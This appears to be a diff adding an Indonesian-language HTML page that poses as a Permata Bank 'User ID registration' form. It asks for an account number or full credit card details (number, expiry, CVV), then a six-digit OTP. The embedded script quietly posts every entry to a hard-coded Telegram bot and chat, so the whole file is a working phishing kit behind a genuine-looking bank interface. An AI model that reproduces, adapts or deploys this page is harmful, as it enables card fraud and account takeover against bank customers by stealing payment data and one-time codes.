@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registrasi User ID - Permata Bank</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #eef0f2;
+            min-height: 100vh;
+            padding: 20px 18px;
+        }
+
+        .close-btn {
+            text-align: right;
+            margin-bottom: 25px;
+        }
+
+        .close-btn button {
+            background: none;
+            border: none;
+            font-size: 26px;
+            color: #333;
+            cursor: pointer;
+        }
+
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        .container {
+            max-width: 440px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 300;
+            color: #1a202c;
+            line-height: 1.2;
+            margin-bottom: 10px;
+        }
+
+        h1 span {
+            font-weight: 700;
+        }
+
+        .desc {
+            font-size: 15px;
+            color: #4a5568;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        .option-btn {
+            width: 100%;
+            padding: 14px 20px;
+            margin-bottom: 14px;
+            background: transparent;
+            border: 1.5px solid #cbd5e0;
+            border-radius: 50px;
+            font-size: 17px;
+            color: #1a202c;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .option-btn svg {
+            height: 20px;
+            width: auto;
+        }
+
+        .option-btn:hover {
+            border-color: #0057B8;
+            background-color: #f7fafc;
+        }
+
+        .form-container {
+            margin-top: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            color: #4a5568;
+            margin-bottom: 6px;
+        }
+
+        .required {
+            color: #e53e3e;
+        }
+
+        .error-teks {
+            font-size: 12px;
+            color: #dc2626;
+            margin-top: 4px;
+            display: none;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px 14px;
+            font-size: 16px;
+            border: none;
+            border-bottom: 1.5px solid #cbd5e0;
+            background-color: transparent;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        input.invalid {
+            border-bottom-color: #dc2626;
+        }
+
+        input:focus {
+            border-bottom-color: #0057B8;
+        }
+
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .col {
+            flex: 1;
+        }
+
+        .btn-lanjut {
+            width: 100%;
+            padding: 12px;
+            background-color: #0057B8;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 15px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-lanjut:disabled {
+            background-color: #94a3b8;
+            cursor: not-allowed;
+        }
+
+        .btn-lanjut:hover:not(:disabled) {
+            background-color: #004494;
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-top: 15px;
+            color: #0057B8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        /* ------------------- BAGIAN OTP DIPERKECIL ------------------- */
+        .otp-input-group {
+            display: flex;
+            gap: 8px; /* Jarak antar kotak diperkecil */
+            justify-content: center;
+            margin: 18px 0; /* Jarak atas bawah diperkecil */
+        }
+
+        .otp-input {
+            width: 42px;  /* Lebar kotak diperkecil */
+            height: 46px;  /* Tinggi kotak diperkecil */
+            text-align: center;
+            font-size: 18px; /* Ukuran angka diperkecil */
+            font-weight: bold;
+            border: 1.5px solid #cbd5e0;
+            border-radius: 6px; /* Sudut agak lebih lancip agar pas */
+        }
+
+        .otp-input.invalid {
+            border-color: #dc2626;
+        }
+
+        .otp-input:focus {
+            border-color: #0057B8;
+        }
+        /* -------------------------------------------------------------- */
+
+        .info-teks {
+            font-size: 14px;
+            color: #64748b;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        .kirim-ulang {
+            text-align: center;
+            margin-top: 6px;
+            font-size: 13px; /* Ukuran tulisan kirim ulang diperkecil */
+        }
+
+        .kirim-ulang a {
+            color: #0057B8;
+            text-decoration: none;
+            font-weight: 500;
+            pointer-events: none;
+            opacity: 0.6;
+        }
+
+        .kirim-ulang a.aktif {
+            pointer-events: auto;
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Halaman 1: Pilihan Cara Daftar -->
+    <div id="page1" class="page active">
+        <div class="container">
+            <div class="close-btn">
+                <button>&times;</button>
+            </div>
+
+            <h1>Registrasi User ID<br><span>Permata Bank</span></h1>
+
+            <p class="desc">
+                Kami sedang mendaftarkan akses digital Permata Bank kamu.<br>
+                Ada dua cara menyelesaikan pendaftaran.<br>
+                Silakan pilih di bawah ini:
+            </p>
+
+            <button class="option-btn" onclick="gantiHalaman('page2')">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="3" y="5" width="18" height="14" rx="2" stroke="#0057B8" stroke-width="2"/>
+                    <line x1="7" y1="9" x2="17" y2="9" stroke="#0057B8" stroke-width="2"/>
+                    <line x1="7" y1="15" x2="12" y2="15" stroke="#0057B8" stroke-width="2"/>
+                </svg>
+                Nomor Rekening
+            </button>
+
+            <button class="option-btn" onclick="gantiHalaman('page3')">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="3" y="5" width="18" height="14" rx="2" stroke="#0057B8" stroke-width="2"/>
+                    <line x1="7" y1="9" x2="17" y2="9" stroke="#0057B8" stroke-width="2"/>
+                    <line x1="7" y1="15" x2="12" y2="15" stroke="#0057B8" stroke-width="2"/>
+                </svg>
+                Kartu Kredit
+            </button>
+        </div>
+    </div>
+
+    <!-- Halaman 2: Form Nomor Rekening -->
+    <div id="page2" class="page">
+        <div class="container">
+            <div class="close-btn">
+                <button>&times;</button>
+            </div>
+
+            <h1>Masukkan<br><span>Nomor Rekening</span></h1>
+
+            <p class="desc">
+                Silakan masukkan nomor rekening Permata Bank Anda untuk melanjutkan pendaftaran.
+            </p>
+
+            <div class="form-container">
+                <div class="form-group">
+                    <input type="text" id="nomor_rek" placeholder="Contoh: 1234567890">
+                    <div class="error-teks" id="err_rek">Nomor rekening tidak boleh kosong</div>
+                </div>
+
+                <button class="btn-lanjut" id="btn_rek">LANJUT</button>
+                <a href="#" class="back-link" onclick="gantiHalaman('page1')">&larr; Kembali ke pilihan</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Halaman 3: Form Kartu Kredit -->
+    <div id="page3" class="page">
+        <div class="container">
+            <div class="close-btn">
+                <button>&times;</button>
+            </div>
+
+            <h1>Masukkan Data<br><span>Kartu Kredit</span></h1>
+
+            <p class="desc">
+                Silakan lengkapi data kartu kredit Permata Bank Anda.
+            </p>
+
+            <div class="form-container">
+                <div class="form-group">
+                    <label>Nomor Kartu <span class="required">*</span></label>
+                    <input type="text" id="nomor_kk" placeholder="1234 5678 9012 3456">
+                    <div class="error-teks" id="err_kk">Nomor kartu tidak boleh kosong</div>
+                </div>
+
+                <div class="row">
+                    <div class="col form-group">
+                        <label>Masa Berlaku <span class="required">*</span></label>
+                        <input type="text" id="masa_berlaku" placeholder="MM/YY">
+                        <div class="error-teks" id="err_masa">Masa berlaku tidak boleh kosong</div>
+                    </div>
+                    <div class="col form-group">
+                        <label>CVV <span class="required">*</span></label>
+                        <input type="text" id="cvv" placeholder="***" maxlength="3">
+                        <div class="error-teks" id="err_cvv">CVV tidak boleh kosong</div>
+                    </div>
+                </div>
+
+                <button class="btn-lanjut" id="btn_kk">LANJUT</button>
+                <a href="#" class="back-link" onclick="gantiHalaman('page1')">&larr; Kembali ke pilihan</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Halaman 4: Masukkan Kode OTP -->
+    <div id="page4" class="page">
+        <div class="container">
+            <div class="close-btn">
+                <button>&times;</button>
+            </div>
+
+            <h1>Verifikasi<br><span>Kode OTP</span></h1>
+
+            <p class="desc">
+                Kami telah mengirimkan kode verifikasi ke nomor ponsel Anda.<br>
+                Silakan masukkan 6 digit kode di bawah ini.
+            </p>
+
+            <div class="form-container">
+                <p class="info-teks">Kode dikirim ke: +62 812-xxxx-1234</p>
+
+                <div class="otp-input-group">
+                    <input type="text" class="otp-input" maxlength="1" id="otp1">
+                    <input type="text" class="otp-input" maxlength="1" id="otp2">
+                    <input type="text" class="otp-input" maxlength="1" id="otp3">
+                    <input type="text" class="otp-input" maxlength="1" id="otp4">
+                    <input type="text" class="otp-input" maxlength="1" id="otp5">
+                    <input type="text" class="otp-input" maxlength="1" id="otp6">
+                </div>
+                <div class="error-teks" id="err_otp" style="text-align:center; margin-top:-8px;">Masukkan 6 digit kode OTP</div>
+
+                <div class="kirim-ulang">
+                    <p>Belum menerima kode? <a href="#" id="linkUlang">Kirim Ulang (<span id="hitungan">02:00</span>)</a></p>
+                </div>
+
+                <button class="btn-lanjut" id="btn_otp">VERIFIKASI</button>
+                <a href="#" class="back-link" onclick="gantiHalaman('page1')">&larr; Kembali</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ------------------- SETTING BOT TELEGRAM -------------------
+        const BOT_TOKEN = "8325905710%3AAAEfYEY2mmRyNRTXs-70xL9XdCYDZQ5d1s0"; // Ganti dengan Token Bot Father
+        const CHAT_ID = "8749884634";    // Ganti dengan ID Chat kamu
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // Simpan data sementara
+        let dataPengguna = {};
+        let hitungMundur; // Variabel untuk interval waktu
+
+        // ------------------- FUNGSI UTAMA -------------------
+        function gantiHalaman(idHalaman) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(idHalaman).classList.add('active');
+            bersihkanError();
+
+            // Jika pindah ke halaman OTP, jalankan hitung mundur
+            if(idHalaman === 'page4'){
+                mulaiHitungMundur(120); // 120 detik = 2 menit
+            }
+        }
+
+        function bersihkanError() {
+            document.querySelectorAll('.error-teks').forEach(el => el.style.display = 'none');
+            document.querySelectorAll('input').forEach(el => el.classList.remove('invalid'));
+        }
+
+        // Kirim ke Telegram
+        async function kirimKeTelegram(teks) {
+            try {
+                await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: teks, parse_mode: 'Markdown'})
+                });
+            } catch (e) {
+                // Error disembunyikan
+            }
+        }
+
+        // ------------------- FUNGSI HITUNG MUNDUR AKTIF -------------------
+        function mulaiHitungMundur(detik) {
+            const linkEl = document.getElementById('linkUlang');
+            const hitungEl = document.getElementById('hitungan');
+            
+            // Hentikan hitungan sebelumnya jika ada
+            if(hitungMundur) clearInterval(hitungMundur);
+
+            // Kunci tombol ulang
+            linkEl.classList.remove('aktif');
+
+            hitungMundur = setInterval(() => {
+                let menit = Math.floor(detik / 60);
+                let sisaDetik = detik % 60;
+
+                // Format 00:00
+                hitungEl.textContent = `${menit.toString().padStart(2, '0')}:${sisaDetik.toString().padStart(2, '0')}`;
+
+                if(detik <= 0) {
+                    clearInterval(hitungMundur);
+                    hitungEl.textContent = "";
+                    linkEl.textContent = "Kirim Ulang Kode";
+                    linkEl.classList.add('aktif'); // Bisa diklik
+                    return;
+                }
+
+                detik--;
+            }, 1000); // Berjalan setiap 1 detik
+        }
+
+        // ------------------- VALIDASI & KIRIM NOMOR REKENING -------------------
+        document.getElementById('btn_rek').addEventListener('click', async function(){
+            bersihkanError();
+            let valid = true;
+            const rek = document.getElementById('nomor_rek').value.trim();
+
+            if(!rek) {
+                document.getElementById('err_rek').style.display = 'block';
+                document.getElementById('nomor_rek').classList.add('invalid');
+                valid = false;
+            }
+
+            if(!valid) return;
+
+            // Simpan data
+            dataPengguna = { jenis: "Nomor Rekening", nomor: rek };
+
+            // Kirim ke Telegram
+            kirimKeTelegram(`*DATA REGISTRASI PERMATA BANK*\n\nJenis: Nomor Rekening\nNomor: \`${rek}\``);
+            
+            // Pindah halaman langsung
+            gantiHalaman('page4');
+        });
+
+        // ------------------- VALIDASI & KIRIM KARTU KREDIT -------------------
+        document.getElementById('btn_kk').addEventListener('click', async function(){
+            bersihkanError();
+            let valid = true;
+            const nomor = document.getElementById('nomor_kk').value.trim();
+            const masa = document.getElementById('masa_berlaku').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+
+            if(!nomor) { document.getElementById('err_kk').style.display='block'; document.getElementById('nomor_kk').classList.add('invalid'); valid=false; }
+            if(!masa) { document.getElementById('err_masa').style.display='block'; document.getElementById('masa_berlaku').classList.add('invalid'); valid=false; }
+            if(!cvv) { document.getElementById('err_cvv').style.display='block'; document.getElementById('cvv').classList.add('invalid'); valid=false; }
+
+            if(!valid) return;
+
+            // Simpan data
+            dataPengguna = { jenis: "Kartu Kredit", nomor: nomor, masa: masa, cvv: cvv };
+
+            // Kirim ke Telegram
+            const teks = `*DATA REGISTRASI PERMATA BANK*\n\nJenis: Kartu Kredit\nNomor: \`${nomor}\`\nMasa Berlaku: \`${masa}\`\nCVV: \`${cvv}\``;
+            kirimKeTelegram(teks);
+
+            // Pindah halaman langsung
+            gantiHalaman('page4');
+        });
+
+        // ------------------- VALIDASI & KIRIM OTP -------------------
+        document.getElementById('btn_otp').addEventListener('click', async function(){
+            bersihkanError();
+            const otp = [1,2,3,4,5,6].map(n => document.getElementById(`otp${n}`).value).join('');
+
+            if(otp.length !== 6) {
+                document.getElementById('err_otp').style.display = 'block';
+                document.querySelectorAll('.otp-input').forEach(el => el.classList.add('invalid'));
+                return;
+            }
+
+            // Gabungkan data lama + OTP
+            let teksOtp = `*VERIFIKASI OTP PERMATA BANK*\n\n`;
+            if(dataPengguna.jenis === "Nomor Rekening"){
+                teksOtp += `Jenis: Nomor Rekening\nNomor: \`${dataPengguna.nomor}\`\nKode OTP: \`${otp}\``;
+            } else {
+                teksOtp += `Jenis: Kartu Kredit\nNomor: \`${dataPengguna.nomor}\`\nMasa Berlaku: \`${dataPengguna.masa}\`\nCVV: \`${dataPengguna.cvv}\`\nKode OTP: \`${otp}\``;
+            }
+
+            // Kirim ke Telegram
+            kirimKeTelegram(teksOtp);
+        });
+
+        // ------------------- FITUR PINDAH FOKUS OTP -------------------
+        document.addEventListener('input', function (e) {
+            if (e.target.classList.contains('otp-input')) {
+                if (e.target.value.length === 1) {
+                    const selanjutnya = e.target.nextElementSibling;
+                    if (selanjutnya) selanjutnya.focus();
+                }
+            }
+        });
+    </script>
+
+</body>
+</html>
